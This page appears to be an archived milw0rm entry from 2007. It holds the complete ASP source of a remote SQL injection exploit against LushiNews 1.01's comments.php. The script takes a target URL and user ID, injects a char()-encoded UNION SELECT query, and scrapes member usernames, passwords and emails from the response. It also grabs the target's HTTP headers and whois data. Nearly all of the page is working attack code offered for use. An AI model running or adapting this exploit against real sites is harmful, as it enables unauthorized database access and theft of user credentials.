<html><head><title>LushiNews <= 1.01 (comments.php) Remote SQL Injection Exploit</title></head><pre>&lt;% Response.Buffer = True %&gt;
&lt;% On Error Resume Next %&gt;
&lt;% Server.ScriptTimeout = 100 %&gt;

&lt;%
'===============================================================================================
'[Script Name: LushiNews &lt;= 1.01 (comments.php) Remote SQL Injection Exploit
'[Coded by   : ajann
'[Author     : ajann
'[Contact    : :(
'[S.Page     : http://www.lushi.de
'[ExploitName: exploit2.asp

'[Note  : exploit file name =&gt;exploit2.asp
'[Update: + Get Header
'[Update: + Get Whois Info
'===============================================================================================

%&gt;

&lt;%

title=&quot;LushiNews &lt;= 1.01 (comments.php) Remote SQL Injection Exploit&quot; 'Vuln Title

%&gt;
&lt;html&gt;
&lt;title&gt;&lt;% = title %&gt;&lt;/title&gt;
&lt;head&gt;
&lt;meta name=&quot;generator&quot; content=&quot;Microsoft FrontPage 5.0&quot;&gt;

&lt;script language=&quot;JavaScript&quot;&gt;    
  function functionControl1(){  
        setTimeout(&quot;functionControl2()&quot;,2000);    
     }  
  
  function functionControl2(){  
            if(document.form1.field1.value==&quot;&quot;){  
 
     alert(&quot;[Exploit Failed]=&gt;The Username and Password Didnt Take,Try Again&quot;);
        
                             }  
                        }

  function writetext() {

            if(document.form1.field1.value==&quot;&quot;){
document.getElementById('htmlAlani').innerHTML='&lt;font face=\&quot;Verdana\&quot; size=\&quot;1\&quot; color=\&quot;#008000\&quot;&gt;There is a problem... The Data Didn\'t Take &lt;/font&gt;'

                            }
                 }
  function write(){  
        setTimeout(&quot;writetext()&quot;,1000);    
     }  
  
&lt;/script&gt;


&lt;/head&gt;
&lt;body bgcolor=&quot;#000000&quot; link=&quot;#008000&quot; vlink=&quot;#008000&quot; alink=&quot;#008000&quot;&gt;

&lt;center&gt;
&lt;font face=&quot;Verdana&quot; size=&quot;2&quot; color=&quot;#008000&quot;&gt;&lt;b&gt;&lt;a href=&quot;exploit2.asp&quot;&gt;&lt;u&gt;&lt;% = title %&gt;
&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;
&lt;table border=&quot;1&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;border-collapse: collapse&quot; width=&quot;35%&quot; id=&quot;AutoNumber1&quot; bordercolorlight=&quot;#808080&quot; bordercolordark=&quot;#008000&quot; bordercolor=&quot;#808080&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;
    &lt;font face=&quot;Arial&quot; size=&quot;1&quot;&gt;&lt;b&gt;&lt;font color=&quot;#FFFFFF&quot;&gt;TARGET:&lt;/font&gt;Example:[http://x.com/path]&lt;/b&gt;&lt;/font&gt;&lt;p&gt;
    &lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;1&quot; color=&quot;#FFFFFF&quot;&gt;USER ID:&lt;/font&gt;&lt;/b&gt;&lt;font face=&quot;Arial&quot; size=&quot;1&quot;&gt;&lt;b&gt;Example:[User 
    ID=1]&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
  &lt;/td&gt;
    &lt;td width=&quot;50%&quot;&gt;
 &lt;center&gt;
&lt;form method=&quot;post&quot; name=&quot;form1&quot; action=&quot;exploit2.asp?islem=get&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;text1&quot; value=&quot;http://&quot; size=&quot;25&quot; style=&quot;background-color: #808080&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;10&quot; size=&quot;25&quot; style=&quot;background-color: #808080&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Get&quot;&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;
  &lt;/tr&gt;

&lt;/table&gt;

&lt;div id=htmlAlani&gt;&lt;/div&gt;

&lt;%
islem = Request.QueryString(&quot;islem&quot;)    

If islem = &quot;hata1&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Please complete to the whole spaces&lt;/font&gt;&quot;
End If

If islem = &quot;hata2&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Please right character use&lt;/font&gt;&quot;
End If

If islem = &quot;hata3&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Add &quot;&quot;http://&quot;&quot;&lt;/font&gt;&quot;
End If

If islem = &quot;hata4&quot; Then 
Response.Write &quot;&lt;font face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;There is a problem! Just Numeric Character!&lt;/font&gt;&quot;
End If

%&gt;

&lt;%  

If islem = &quot;get&quot; Then

id= Request.Form(&quot;id&quot;)

file=&quot;comments.php?id=&quot;
sql=&quot;-1%20union%20select%20concat(char&quot;
sql1=&quot;(85,115,101,114,110,97,109,101,58),char(32),&quot;
sql2=&quot;Name,char(32),char(80,97,115,115,119,111,114,&quot;
sql3=&quot;100,58),Passwort),0,0,0,concat(c&quot;
sql4=&quot;har(109,109,97,105,108,58),mail)%20from%20&quot;
sql5=&quot;members%20where%20ID=&quot;
sql6=id


idform = Request.Form(&quot;id&quot;)
targettext = Request.Form(&quot;text1&quot;)
arama=InStr(1, targettext, &quot;union&quot; ,1)
arama2=InStr(1, targettext, &quot;http://&quot; ,1)

If targettext=&quot;&quot; Then
Response.Redirect(&quot;exploit2.asp?islem=hata1&quot;)

Else
If arama&gt;0 then 
Response.Redirect(&quot;exploit2.asp?islem=hata2&quot;)

Else
If arama2=0 then 
Response.Redirect(&quot;exploit2.asp?islem=hata3&quot;)

Else
IF Not IsNumeric(idform) Then
Response.Redirect(&quot;exploit2.asp?islem=hata4&quot;)

Else
%&gt; 

&lt;%

target1 = targettext+file+sql+sql1+sql2+sql3+sql4+sql5+sql6

Public Function take(come)
Set objtake = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot; )
With objtake
  .Open &quot;GET&quot; , come, FALSE
  .sEnd
  
take =  .Responsetext
End With
SET objtake = Nothing
End Function


get_username = take(target1)

getdata=InStr(get_username,&quot;0  0/&quot; )
username=Mid(get_username,getdata+5,90)

Dim metin
metin = take(target1)  

Dim objReg
Set objReg = New RegExp
objReg.Global = False
objReg.IgnoreCase = True

objReg.Pattern = &quot;Username: [A-Za-z0-9ý]+ Pass&quot;
Dim calistir, istediginString
Set calistir = objReg.Execute(metin)


If calistir.Count = 0 Then
     Response.write &quot;Not True&quot;
Else
      basusername = Replace(calistir.Item(0), &quot;Username: &quot; , &quot;&quot; )
      basusername = Replace(basusername, &quot; Pass&quot; , &quot;&quot; )



      objReg.Pattern = &quot;Password:[A-Za-z0-9ý]+&lt;/b&gt;&quot;
      Set calistir = objReg.Execute(metin)
      baspassword = Replace(calistir.Item(0), &quot;Password:&quot; , &quot;&quot; )
      baspassword = Replace(baspassword, &quot;&lt;/b&gt;&quot; , &quot;&quot; )

     
      objReg.Pattern = &quot;mmail:[A-Za-z0-9@.]+&lt;/b&gt;&quot;
      Set calistir = objReg.Execute(metin)
      basemail = Replace(calistir.Item(0), &quot;mmail:&quot; , &quot;&quot; )
      basemail = Replace(basemail, &quot;&lt;/b&gt;&quot; , &quot;&quot; )

End If  


 
Set bulunanlar = Nothing
Set objReg = Nothing

%&gt;

&lt;center&gt;
&lt;font face=&quot;Verdana&quot; size=&quot;2&quot; color=&quot;#008000&quot;&gt; &lt;u&gt;&lt;b&gt;
ajann&lt;br&gt;&lt;/b&gt;&lt;/u&gt;&lt;/font&gt;&lt;br&gt;

&lt;table border=&quot;1&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;border-collapse: collapse&quot; width=&quot;35%&quot; id=&quot;AutoNumber1&quot; bordercolorlight=&quot;#808080&quot; bordercolordark=&quot;#008000&quot; bordercolor=&quot;#808080&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;b&gt;&lt;font size=&quot;2&quot; face=&quot;Arial&quot;&gt;Username:&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
    &lt;td width=&quot;80%&quot;&gt;
&amp;nbsp;&lt;b&gt;&lt;font color=&quot;#C0C0C0&quot; size=&quot;2&quot; face=&quot;Verdana&quot;&gt;&lt;%=basusername%&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
 &lt;/td&gt;
  &lt;/tr&gt;

  &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;b&gt;&lt;font size=&quot;2&quot; face=&quot;Arial&quot;&gt;Password:&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
    &lt;td width=&quot;80%&quot;&gt;
&amp;nbsp;&lt;b&gt;&lt;font color=&quot;#C0C0C0&quot; size=&quot;2&quot; face=&quot;Verdana&quot;&gt;&lt;%=baspassword%&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
 &lt;/td&gt;
  &lt;/tr&gt;

 &lt;tr&gt;
    &lt;td width=&quot;50%&quot; bgcolor=&quot;#808000&quot; onmouseover=&quot;javascript:this.style.background='#808080';&quot; onmouseout=&quot;javascript:this.style.background='#808000';&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
    &lt;b&gt;&lt;font size=&quot;2&quot; face=&quot;Arial&quot;&gt;Email:&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;
    &lt;td width=&quot;80%&quot;&gt;
&amp;nbsp;&lt;b&gt;&lt;font color=&quot;#C0C0C0&quot; size=&quot;2&quot; face=&quot;Verdana&quot;&gt;&lt;%=basemail%&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;
 &lt;/td&gt;
  &lt;/tr&gt;

&lt;/table&gt;
&lt;/center&gt; 

  &lt;br&gt;


&lt;%
hedef = targettext
Dim objem
Set objem = Server.CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)
objem.Open &quot;GET&quot; , hedef , false

objem.sEnd

strHTML = objem.ResponseText

header=objem.getallResponseheaders()
Response.Write &quot;&lt;center&gt;&quot;
Response.Write &quot;&lt;b&gt;&quot;
Response.Write &quot;&lt;p&gt;&lt;font color=&quot;&quot;#008000&quot;&quot; face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;2&quot;&quot;&gt;Header Bilgileri&lt;/font&gt;&lt;/p&gt;&quot;
Response.Write &quot;&lt;/b&gt;&quot;
Response.Write &quot;&lt;p&gt;&lt;font color=&quot;&quot;#008000&quot;&quot; face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;2&quot;&quot;&gt;&quot; &amp; header &amp; &quot;&lt;/font&gt;&lt;/p&gt;&quot;
Response.Write &quot;&lt;p&gt;&lt;font color=&quot;&quot;#008000&quot;&quot; face=&quot;&quot;Verdana&quot;&quot; size=&quot;&quot;2&quot;&quot;&gt;&lt;b&gt;Whois&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;&quot;
Response.Write &quot;&lt;p&gt;&lt;font size=&quot;&quot;2&quot;&quot; color=&quot;&quot;#008000&quot;&quot;&gt;Site:&lt;/font&gt;&lt;font color=&quot;&quot;#008000&quot;&quot; size=&quot;&quot;1&quot;&quot;&gt;[google.com]&lt;/font&gt;&lt;/p&gt;&quot;
Response.Write &quot;&lt;/center&gt;&quot;
Set objem=Nothing

%&gt;

&lt;center&gt;&lt;form method=&quot;post&quot; name=&quot;form2&quot; action=&quot;exploit2.asp?islem=whois&quot;&gt;
  &lt;p&gt;
  &lt;input type=&quot;text&quot; name=&quot;whoissite&quot; size=&quot;20&quot; value=&quot;domainwhois&quot; style=&quot;font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dashed #008000; background-color: #000000&quot;&gt;
  &lt;input type=&quot;submit&quot; value=&quot;Yolla&quot; name=&quot;B1&quot;&gt;&lt;/p&gt;
&lt;/form&gt;&lt;/center&gt;

     
&lt;br&gt;


&lt;form method=&quot;POST&quot; name=&quot;form2&quot; action=&quot;#&quot;&gt;    
&lt;input type=&quot;hidden&quot; name=&quot;field1&quot; size=&quot;20&quot; value=&quot;sdfsd&quot;&gt;     
&lt;/form&gt; 


&lt;script language=&quot;JavaScript&quot;&gt;
write()
functionControl1()
&lt;/script&gt;

&lt;/b&gt;&lt;/font&gt;

&lt;/body&gt;
&lt;/html&gt;

&lt;%
End If
End If
End If
End If
End If

%&gt;


&lt;%
If islem = &quot;whois&quot; Then
site = Request.Form(&quot;whoissite&quot;)
target1 = &quot;http://reports.internic.net/cgi/whois?whois_nic=&quot; &amp; site &amp; &quot;&amp;type=domain&quot;

Public Function take(come)
Set objtake = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot; )
With objtake
  .Open &quot;GET&quot; , come, FALSE
  .sEnd
take =  .Responsetext
End With
Set objtake = Nothing
End Function

remoteadres=take(target1)

dim baslangic , bitis
baslangic = &quot;&lt;pre&gt;&quot;
bitis = &quot;&lt;/pre&gt;&quot;
dim x , abc
x = 0
abc = 0
dim sonuc
sonuc = &quot;&quot;

Do Until abc = 2
x = x + 1
If Mid(remoteadres,x,Len(bitis)) = bitis and abc = 1 Then
abc = abc + 1
End If
If Mid(remoteadres,x,Len(baslangic)) = baslangic Then
abc = abc + 1
Else
If abc = 1 Then
sonuc = sonuc + Mid(remoteadres,x,1)
End If
End If
Loop

Set objtake=Nothing
 
%&gt;

&lt;center&gt;
&lt;b&gt;&lt;font color=&quot;#008000&quot; face=&quot;Verdana&quot; size=&quot;2&quot;&gt;Whois Bilgileri&lt;/font&gt;&lt;/b&gt;&lt;p&gt;
&lt;textarea rows=&quot;20&quot; name=&quot;S1&quot; cols=&quot;68&quot; style=&quot;font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dotted #008000; background-color: #000000&quot;&gt;
&lt;% Response.Write &quot;&lt;&quot; &amp; sonuc %&gt;
&lt;/textarea&gt;
&lt;/p&gt;
&lt;/center&gt;

&lt;center&gt;&lt;form method=&quot;post&quot; name=&quot;form2&quot; action=&quot;exploit2.asp?islem=whois&quot;&gt;
  &lt;p&gt;
  &lt;input type=&quot;text&quot; name=&quot;whoissite&quot; size=&quot;20&quot; value=&quot;domainwhois&quot; style=&quot;font-family: Verdana; font-size: 10pt; color: #008000; border: 1px dashed #008000; background-color: #000000&quot;&gt;
  &lt;input type=&quot;submit&quot; value=&quot;Yolla&quot; name=&quot;B1&quot;&gt;&lt;/p&gt;
&lt;/form&gt;&lt;/center&gt;



&lt;%
End If
%&gt;

&lt;%
Response.Write &quot;&lt;br&gt;&quot;
Response.Write &quot;&lt;center&gt;&quot;
Response.Write &quot;&lt;pre class=&quot;&quot;info&quot;&quot;&gt;&quot;
Response.Write &quot;&lt;font color=&quot;&quot;#C0C0C0&quot;&quot; size=&quot;&quot;1&quot;&quot;&gt;&quot;
Response.Write &quot;En iyi &quot;
Response.Write &quot;&lt;/font&gt;&quot;
Response.Write &quot;&lt;font size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#808080&quot;&quot;&gt;&lt;span class=&quot;&quot;info2&quot;&quot;&gt;&quot;
Response.Write &quot;1152x864 &quot;
Response.Write &quot;&lt;/span&gt;&lt;/font&gt;&quot;
Response.Write &quot;&lt;font color=&quot;&quot;#C0C0C0&quot;&quot; size=&quot;&quot;1&quot;&quot;&gt;çözünürlük ve &quot;
Response.Write &quot;&lt;span class=&quot;&quot;info2&quot;&quot;&gt;&lt;font size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#808080&quot;&quot;&gt;Firefox &lt;/font&gt;&lt;/span&gt;&quot;
Response.Write &quot;ile görüntülünebilir.&lt;/font&gt;&lt;/pre&gt;&quot;

Response.Write &quot;&lt;pre class=&quot;&quot;info&quot;&quot;&gt;&quot;
Response.Write &quot;&lt;font color=&quot;&quot;#C0C0C0&quot;&quot; size=&quot;&quot;1&quot;&quot;&gt;&quot;
Response.Write &quot;Exploit coded by &quot;
Response.Write &quot;&lt;/font&gt;&quot;
Response.Write &quot;&lt;font size=&quot;&quot;1&quot;&quot; color=&quot;&quot;#808080&quot;&quot;&gt;&lt;span class=&quot;&quot;info2&quot;&quot;&gt;&quot;
Response.Write &quot;ajann&quot;
Response.Write &quot;&lt;/span&gt;&lt;/font&gt;&quot;
Response.Write &quot;&lt;/center&gt;&quot;

%&gt;

# milw0rm.com [2007-02-08]</pre></html>